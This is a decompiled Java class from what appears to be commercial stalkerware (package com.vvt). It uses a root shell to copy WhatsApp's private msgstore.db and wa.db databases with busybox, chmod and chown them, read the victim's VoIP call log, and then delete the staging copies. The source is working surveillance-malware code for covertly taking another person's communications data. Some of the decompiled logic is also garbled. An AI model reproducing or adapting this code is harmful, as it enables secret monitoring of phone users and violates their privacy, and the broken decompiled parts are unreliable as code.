package com.vvt.capture.wa.voip.calllog.limited;

import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.List;

public class LimitedWhatsAppCallLogQuery
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private String c;
  private String d;
  private boolean e = false;
  private LimitedWhatsAppCallLogQuery.DatabaseStructure f;
  
  public LimitedWhatsAppCallLogQuery(String paramString1, String paramString2)
  {
    LimitedWhatsAppCallLogQuery.DatabaseStructure localDatabaseStructure = LimitedWhatsAppCallLogQuery.DatabaseStructure.UNKNOWN;
    this.f = localDatabaseStructure;
    this.c = paramString1;
    this.d = paramString2;
  }
  
  private static String a(String paramString)
  {
    return p.a(paramString, "whatsapp_calllog");
  }
  
  public static String a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    return a(paramString1, "msgstore.db", paramString2, paramString3, paramString4);
  }
  
  private static String a(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5)
  {
    Object localObject1 = p.a(paramString1, paramString2);
    boolean bool1 = ShellUtil.b((String)localObject1);
    String str1 = p.a(paramString3, paramString2);
    Object localObject3;
    int i;
    if (bool1)
    {
      localObject3 = "mkdir %s; chmod 777 %s; chown %s.%s %s";
      i = 5;
    }
    try
    {
      Object localObject4 = new Object[i];
      int j = 0;
      Object localObject5 = null;
      localObject4[0] = paramString3;
      j = 1;
      localObject4[j] = paramString3;
      j = 2;
      localObject4[j] = paramString4;
      j = 3;
      localObject4[j] = paramString4;
      j = 4;
      localObject4[j] = paramString3;
      localObject3 = String.format((String)localObject3, (Object[])localObject4);
      KMShell.a((String)localObject3);
      bool1 = com.vvt.aa.a.c();
      if (bool1) {
        ShellUtil.k(paramString3);
      }
      localObject4 = new java/util/Hashtable;
      ((Hashtable)localObject4).<init>();
      ((Hashtable)localObject4).put(localObject1, str1);
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject3 = ((StringBuilder)localObject3).append((String)localObject1);
      localObject5 = "-shm";
      localObject3 = ((StringBuilder)localObject3).append((String)localObject5);
      localObject3 = ((StringBuilder)localObject3).toString();
      localObject5 = new java/lang/StringBuilder;
      ((StringBuilder)localObject5).<init>();
      localObject5 = ((StringBuilder)localObject5).append(str1);
      String str2 = "-shm";
      localObject5 = ((StringBuilder)localObject5).append(str2);
      localObject5 = ((StringBuilder)localObject5).toString();
      ((Hashtable)localObject4).put(localObject3, localObject5);
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject1 = ((StringBuilder)localObject3).append((String)localObject1);
      localObject3 = "-wal";
      localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
      localObject1 = ((StringBuilder)localObject1).toString();
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject3 = ((StringBuilder)localObject3).append(str1);
      localObject5 = "-wal";
      localObject3 = ((StringBuilder)localObject3).append((String)localObject5);
      localObject3 = ((StringBuilder)localObject3).toString();
      ((Hashtable)localObject4).put(localObject1, localObject3);
      localObject5 = ((Hashtable)localObject4).keys();
      for (;;)
      {
        boolean bool2 = ((Enumeration)localObject5).hasMoreElements();
        if (!bool2) {
          break;
        }
        localObject1 = ((Enumeration)localObject5).nextElement();
        localObject1 = (String)localObject1;
        localObject3 = ((Hashtable)localObject4).get(localObject1);
        localObject3 = (String)localObject3;
        str2 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
        int m = 7;
        Object[] arrayOfObject = new Object[m];
        int n = 0;
        arrayOfObject[0] = paramString5;
        n = 1;
        arrayOfObject[n] = localObject1;
        int k = 2;
        arrayOfObject[k] = localObject3;
        k = 3;
        arrayOfObject[k] = localObject3;
        k = 4;
        arrayOfObject[k] = paramString4;
        k = 5;
        arrayOfObject[k] = paramString4;
        k = 6;
        arrayOfObject[k] = localObject3;
        localObject1 = String.format(str2, arrayOfObject);
        KMShell.a((String)localObject1);
        bool3 = com.vvt.aa.a.c();
        if (bool3) {
          ShellUtil.k((String)localObject3);
        }
        bool3 = a;
        if (!bool3) {}
      }
      bool3 = a;
      if (bool3) {}
      localObject1 = str1;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool3 = b;
        if (bool3) {}
        bool3 = false;
        Object localObject2 = null;
      }
    }
    bool1 = a;
    if (bool1) {}
    return (String)localObject1;
  }
  
  private String b()
  {
    return p.a(this.c, "busybox");
  }
  
  public static String b(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    return a(paramString1, "wa.db", paramString2, paramString3, paramString4);
  }
  
  private void c()
  {
    String str1 = a(this.c);
    String str2 = "rm -r %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  public g a()
  {
    boolean bool1 = a;
    if (bool1) {}
    long l = -1;
    try
    {
      localObject = com.vvt.capture.wa.limited.a.a();
      if (localObject != null)
      {
        String str1 = this.c;
        str1 = a(str1);
        String str2 = b();
        String str3 = this.d;
        localObject = a((String)localObject, str1, str3, str2);
        boolean bool2 = com.vvt.ag.b.a((String)localObject);
        if (!bool2) {
          l = com.vvt.capture.wa.voip.calllog.b.a((String)localObject);
        }
        c();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject;
        Long localLong;
        boolean bool3 = b;
        if (!bool3) {}
      }
    }
    localObject = new com/vvt/base/capture/FxSimpleEventReference;
    ((FxSimpleEventReference)localObject).<init>();
    localLong = Long.valueOf(l);
    ((FxSimpleEventReference)localObject).setReference(localLong);
    bool1 = a;
    if (bool1) {}
    return (g)localObject;
  }
  
  public List a(int paramInt)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    for (;;)
    {
      try
      {
        localObject1 = com.vvt.capture.wa.limited.a.a();
        Object localObject2 = b();
        String str1 = this.c;
        str1 = a(str1);
        if (localObject1 != null)
        {
          int i = ((String)localObject1).length();
          if (i > 0)
          {
            String str2 = this.d;
            String str3 = a((String)localObject1, str1, str2, (String)localObject2);
            boolean bool2 = a;
            if (bool2) {}
            str2 = this.d;
            String str4 = b((String)localObject1, str1, str2, (String)localObject2);
            bool1 = a;
            if (bool1) {}
            localObject1 = this.f;
            localObject2 = LimitedWhatsAppCallLogQuery.DatabaseStructure.UNKNOWN;
            if (localObject1 == localObject2)
            {
              bool1 = com.vvt.capture.wa.voip.calllog.b.b(str3);
              this.e = bool1;
              bool1 = this.e;
              if (!bool1) {
                continue;
              }
              localObject1 = LimitedWhatsAppCallLogQuery.DatabaseStructure.OLD_DESIGN;
              this.f = ((LimitedWhatsAppCallLogQuery.DatabaseStructure)localObject1);
            }
            bool1 = a;
            if (bool1) {}
            long l1 = com.vvt.capture.wa.voip.calllog.b.a(str3);
            long l2 = 0L;
            boolean bool3 = a;
            if (bool3) {}
            bool3 = this.e;
            String str5 = Integer.toString(paramInt);
            localObject1 = com.vvt.capture.wa.voip.calllog.b.a(l2, l1, bool3, str3, str4, str5);
            localArrayList.addAll((Collection)localObject1);
            bool1 = a;
            if (bool1) {}
            c();
          }
        }
      }
      catch (Exception localException)
      {
        Object localObject1;
        bool1 = b;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return localArrayList;
      localObject1 = LimitedWhatsAppCallLogQuery.DatabaseStructure.NEW_DESIGN;
    }
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = paramg1 instanceof FxSimpleEventReference;
    if (bool1)
    {
      bool1 = paramg2 instanceof FxSimpleEventReference;
      if (!bool1) {}
    }
    for (;;)
    {
      try
      {
        Object localObject1 = ((g)paramg1).getReference();
        localObject1 = (Long)localObject1;
        long l1 = ((Long)localObject1).longValue();
        Object localObject2 = ((g)paramg2).getReference();
        localObject2 = (Long)localObject2;
        long l2 = ((Long)localObject2).longValue();
        localObject3 = com.vvt.capture.wa.limited.a.a();
        String str1 = b();
        String str2 = this.c;
        Object localObject4 = a(str2);
        if (localObject3 != null)
        {
          int i = ((String)localObject3).length();
          if (i > 0)
          {
            str2 = this.d;
            str2 = a((String)localObject3, (String)localObject4, str2, str1);
            boolean bool2 = a;
            if (bool2) {}
            String str3 = this.d;
            str1 = b((String)localObject3, (String)localObject4, str3, str1);
            boolean bool3 = a;
            if (bool3) {}
            localObject3 = this.f;
            localObject4 = LimitedWhatsAppCallLogQuery.DatabaseStructure.UNKNOWN;
            if (localObject3 == localObject4)
            {
              bool3 = com.vvt.capture.wa.voip.calllog.b.b(str2);
              this.e = bool3;
              bool3 = this.e;
              if (!bool3) {
                continue;
              }
              localObject3 = LimitedWhatsAppCallLogQuery.DatabaseStructure.OLD_DESIGN;
              this.f = ((LimitedWhatsAppCallLogQuery.DatabaseStructure)localObject3);
            }
            bool3 = a;
            if (bool3) {}
            bool3 = this.e;
            localObject1 = com.vvt.capture.wa.voip.calllog.b.a(l1, l2, bool3, str2, str1);
            localArrayList.addAll((Collection)localObject1);
            bool1 = a;
            if (bool1) {}
            c();
          }
        }
      }
      catch (Exception localException)
      {
        Object localObject3;
        bool1 = b;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return localArrayList;
      localObject3 = LimitedWhatsAppCallLogQuery.DatabaseStructure.NEW_DESIGN;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wa/voip/calllog/limited/LimitedWhatsAppCallLogQuery.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */